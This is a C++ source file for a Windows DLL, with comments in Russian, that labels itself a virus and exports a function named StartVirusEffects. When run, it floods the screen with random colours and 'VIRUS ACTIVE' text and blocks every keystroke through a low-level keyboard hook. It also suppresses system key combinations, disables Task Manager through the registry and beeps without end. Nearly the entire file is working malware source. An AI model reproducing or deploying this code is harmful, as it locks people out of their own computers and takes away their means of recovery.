#include <windows.h>
#include <dwmapi.h>
#include <gdiplus.h>
#include <math.h>
#include <thread>
#include <vector>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "dwmapi.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;

// RGB эффекты
DWORD WINAPI RGBEffects(LPVOID lpParam)
{
    HDC hdc = GetDC(NULL);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    while (true)
    {
        for (int i = 0; i < 100; i++)
        {
            int x = rand() % width;
            int y = rand() % height;
            int size = 10 + rand() % 50;
            
            HBRUSH brush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
            RECT rect = { x, y, x + size, y + size };
            FillRect(hdc, &rect, brush);
            DeleteObject(brush);
            
            Sleep(10);
        }
        
        // Мерцание экрана
        InvalidateRect(NULL, NULL, TRUE);
        UpdateWindow(GetDesktopWindow());
        Sleep(100);
    }
    
    ReleaseDC(NULL, hdc);
    return 0;
}

// Блокировка клавиш
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
    return 1; // Блокируем все клавиши
}

// Отображение картинок поверх всех окон
void ShowOverlayImages()
{
    // Загрузка и отображение icon.png поверх всех окон
    // Реализация через GDI+
    std::thread([]() {
        while (true)
        {
            HWND hwnd = GetDesktopWindow();
            HDC hdc = GetDC(hwnd);
            
            // Создаем временную реализацию
            for (int i = 0; i < 5; i++)
            {
                int x = rand() % 1920;
                int y = rand() % 1080;
                TextOut(hdc, x, y, L"⚠ ВИРУС АКТИВЕН ⚠", 17);
            }
            
            ReleaseDC(hwnd, hdc);
            Sleep(500);
        }
    }).detach();
}

// Основная функция вируса
extern "C" __declspec(dllexport) void StartVirusEffects()
{
    // 1. Запуск RGB эффектов
    CreateThread(NULL, 0, RGBEffects, NULL, 0, NULL);
    
    // 2. Установка хука на клавиатуру
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, GetModuleHandle(NULL), 0);
    
    // 3. Отображение оверлеев
    ShowOverlayImages();
    
    // 4. Блокировка сочетаний клавиш
    SystemParametersInfo(SPI_SETSCREENSAVERRUNNING, TRUE, NULL, 0);
    
    // 5. Отключение диспетчера задач
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, 
        TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 
        0, KEY_SET_VALUE, &hKey);
    
    DWORD value = 1;
    RegSetValueEx(hKey, TEXT("DisableTaskMgr"), 0, REG_DWORD, (BYTE*)&value, sizeof(value));
    RegCloseKey(hKey);
    
    // Бесконечный цикл
    while (true)
    {
        // Случайные звуки
        Beep(rand() % 2000 + 500, 100);
        Sleep(1000);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Инициализация
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
